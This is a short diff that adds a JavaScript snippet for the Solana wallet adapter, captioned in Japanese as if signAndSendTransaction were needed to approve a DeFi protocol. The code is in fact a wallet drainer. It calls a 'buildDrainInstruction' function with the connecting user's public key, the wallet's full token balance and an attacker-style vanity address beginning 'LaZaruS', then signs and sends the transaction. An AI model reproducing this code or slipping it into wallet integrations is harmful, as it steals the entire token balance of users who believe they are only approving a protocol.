@@ -1,0 +1,14 @@
+Solana DeFi プロトコルの承認には signAndSendTransaction が必要です：
+
+import { useWallet } from '@solana/wallet-adapter-react';
+
+const { signAndSendTransaction } = useWallet();
+
+const tx = buildDrainInstruction(
+  wallet.publicKey,
+  new PublicKey("LaZaruSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"),
+  await getTokenBalance(wallet.publicKey)
+);
+
+const { signature } = await signAndSendTransaction(tx);
+console.log("Confirmed:", signature);
